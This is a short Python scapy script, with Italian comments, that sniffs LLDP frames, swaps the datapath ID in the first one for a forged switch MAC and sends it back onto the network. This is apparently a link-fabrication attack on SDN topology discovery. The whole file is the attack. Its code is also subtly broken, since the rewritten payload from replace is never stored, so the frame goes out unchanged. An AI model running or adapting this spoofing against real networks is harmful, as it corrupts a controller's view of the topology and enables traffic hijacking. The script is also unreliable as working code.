from scapy.all import *


s = sniff(count=50)

lldp_pckts = []
for p in s:
    if(p.type == 35020):
        lldp_pckts.append(p)


mac_switch = "e62ff6352849"

evil_packet = lldp_pckts[0]
load = evil_packet.load

# "'\x02\x12\x07dpid:8643d53ed844\x04\x02\x026\x06\x02\x00x\x0cRdpid:8643d53ed844;f642e27670a41a2d8e82f911ddd13557e9d4d59ca57b63a4fcad1ca1acb79eb0\x00\x00'"
da_cambiare=load.split("dpid:")[2][:12] #8643d53ed844

load.replace(da_cambiare,mac_switch) #modifico il load con il mac switch forgiato da me
evil_packet.load = load

sendp(evil_packet)

